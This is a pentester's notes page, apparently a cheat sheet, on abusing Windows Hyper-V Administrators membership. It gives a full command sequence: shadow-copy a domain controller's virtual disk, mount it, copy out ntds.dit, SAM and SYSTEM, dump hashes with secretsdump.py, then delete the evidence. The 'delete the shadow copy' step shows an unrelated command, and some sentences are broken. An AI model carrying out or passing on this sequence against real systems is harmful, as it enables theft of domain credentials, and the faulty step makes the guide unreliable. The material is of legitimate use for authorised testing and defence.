---
created: 2026-08-11
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---

> [!abstract]+ **Scope**: Privilege escalation through membership in the `Hyper-V Administrators` group.

- [ ] Confirm membership in the `Hyper-V Administrators` group (`whoami /groups` or `Get-LocalGroupMember`).
- [ ] Enumerate Hyper-V virtual machines and their associated virtual disk locations (`Get-VM`, `Get-VMHardDiskDrive`).
- [ ] Create a Volume Shadow Copy of the volume containing a locked virtual disk (`vssadmin`).
- [ ] Copy the virtual disk from the shadow copy and mount it read-only (`Mount-VHD -ReadOnly`).
- [ ] Extract credential stores (`SAM`, `SYSTEM`, or `NTDS.dit`) and recover password hashes with `secretsdump.py`.
- [ ] Attempt to escalate privileges using the recovered credentials. 
---
## `Hyper-V Administrators`

>The **`Hyper-V Administrators`** group is a built-in Windows security group that allows members to **manage Hyper-V virtual machines, snapshots, and virtual disks** without full local administrator privileges.

- Members of `Hyper-V Administrators` can manage Hyper-V virtual machines and access their associated virtual disks (`.vhd` and `.vhdx`). Access to the virtual disk often means access to the guest operating system's filesystem.
- If a Domain Controller or other sensitive system runs as a Hyper-V guest, with access to its, you can extract sensitive files such as offline copies of `SAM`, `SYSTEM`, `SECURITY`, and `NTDS.dit`

## Checking group membership

- Check whether your active account belongs to `Hyper-V Administrators`:

```powershell
whoami /groups
```

```powershell
net localgroup "Hyper-V Administrators"
```

```powershell
Get-LocalGroupMember -Group "Hyper-V Administrators"
```

- Enumerate running Hyper-V virtual machines on the host:

```powershell
Get-VM
```

- Display virtual disk file paths associated with virtual machines:

```powershell
Get-VMHardDiskDrive -VMName *
```

```powershell
Get-VM | Get-VMHardDiskDrive
```

| Parameter             | Description                                                                          |
| :-------------------- | :----------------------------------------------------------------------------------- |
| `Get-VM`              | List virtual machine names, operational states, and memory allocations.              |
| `Get-VMHardDiskDrive` | Identify specific `.vhd` and `.vhdx` storage paths associated with virtual machines. |

## Extracting guest secrets via VHDX disk mounting

- Hyper-V locks `.vhdx` files while virtual machines are running. Creating a Volume Shadow Copy allows copying the locked virtual disk for offline access.

1. Create a Volume Shadow Copy for the volume hosting the target disk image:

```powershell
vssadmin create shadow /for=C:
```

>[!tip]+
>- `vssadmin create shadow /for=C:` output should explicitly the location of the new volume. To get it separately:
>```powershell
>vssadmin list shadows
>```

2. Copy the locked `.vhdx` file from the shadow copy to a temporary working directory:

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Hyper-V\Virtual Hard Disks\DC01.vhdx C:\Windows\Temp\DC01.vhdx
```

3. Mount the virtual hard disk in read-only mode to prevent altering guest filesystem metadata:

```powershell
Mount-VHD -Path "C:\Windows\Temp\DC01.vhdx" -ReadOnly
```

| Parameter | Description |
| :--- | :--- |
| `-Path` | Specifies the path to the target `.vhd` or `.vhdx` virtual disk image. |
| `-ReadOnly` | Mounts the disk with read-only attributes to avoid data corruption or timestamp modification. |

4. Identify the drive letter assigned to the mounted virtual volume:

```powershell
Get-Volume
```

5. Extract the credential stores from the mounted filesystem:

- For a Domain Controller guest VM, extract `ntds.dit` and the `SYSTEM` hive:

```powershell
copy E:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
copy E:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM_guest
```

- For a standard Windows guest VM, extract `SAM` and `SYSTEM` hives:

```powershell
copy E:\Windows\System32\config\SAM C:\Windows\Temp\SAM_guest
copy E:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM_guest
```

6. Dismount the virtual hard disk:

```powershell
Dismount-VHD -Path "C:\Windows\Temp\DC01.vhdx"
```


7. Extract credential hashes offline on your attacking system using `secretsdump.py`:

```bash
secretsdump.py -sam SAM_guest -system SYSTEM_guest LOCAL
```

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM_guest LOCAL
```

| Parameter | Description |
| :--- | :--- |
| `-sam` | Specifies path to guest `SAM` registry hive file. |
| `-ntds` | Specifies path to guest `ntds.dit` Active Directory database. |
| `-system` | Specifies path to guest `SYSTEM` registry hive for key decryption. |
| `LOCAL` | Parses extracted database offline on the local Linux attacker machine. |

>[!tip]+
> - Remove copied virtual disk files and extracted registry hives extracting credentials:
>
> ```powershell
> Remove-Item -Path "C:\Windows\Temp\DC01.vhdx" -Force
> ```
> ```powershell
> Remove-Item -Path "C:\Windows\Temp\ntds.dit" -Force
> ```
> ```powershell
> Remove-Item -Path "C:\Windows\Temp\*_guest" -Force
> ```
> - Delete the shadow copy:
>```powershell
> Get-VM | Get-VMHardDiskDrive
> ```

>[!tip]+
> - Members of `Hyper-V Administrators` can interact with guest virtual machines over Hyper-V Direct Sockets (HV-Sockets) using PowerShell remoting.
> 
> - Open an interactive PowerShell session into a guest VM over Direct Sockets:
> 
> ```powershell
> Enter-PSSession -VMName "DC01"
> ```
> 
> - Execute a command block inside the target guest virtual machine:
> 
> ```powershell
> Invoke-Command -VMName "DC01" -ScriptBlock { whoami }
> ```

## References and further reading

- [`Hyper-V Administrators — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-security-groups-in-active-directory#hyper-v-administrators)
- [`Mount-VHD — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd)
- [`Abusing Hyper-V Administrators Group — Red Team Notes`](https://www.ired.team/offensive-security/privilege-escalation/hyper-v-administrators-privilege-escalation)
- [`impacket-secretsdump — Impacket`](https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py)
